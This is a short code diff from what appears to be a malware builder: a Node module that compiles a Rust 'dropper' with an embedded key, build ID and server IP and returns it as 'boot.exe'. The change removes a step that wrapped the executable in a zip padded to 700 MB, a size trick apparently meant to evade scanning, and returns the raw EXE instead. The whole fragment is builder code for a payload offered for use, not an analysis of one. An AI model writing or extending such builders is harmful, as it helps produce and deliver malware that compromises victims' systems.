@@ -4,13 +4,10 @@ import path from 'node:path';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 import { fileURLToPath } from 'node:url';
-import { zipPaddedExe } from './zip.js';
 
 const execFileP = promisify(execFile);
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const DROPPER_DIR = path.join(__dirname, '..', 'dropper');
-
-const PAD_TO = 700 * 1024 * 1024;
 
 export async function buildBoot({ key, buildId, serverIp }) {
     const srcPath = path.join(DROPPER_DIR, 'src', 'main.rs');
@@ -35,5 +32,6 @@ export async function buildBoot({ key, buildId, serverIp }) {
     code = code.replace(serverIp, '__SERVER_IP__');
     fs.writeFileSync(srcPath, code);
 
-    return await zipPaddedExe(launcherBuf, 'boot.exe', PAD_TO);
+    // Return the raw EXE buffer directly
+    return launcherBuf;
 }
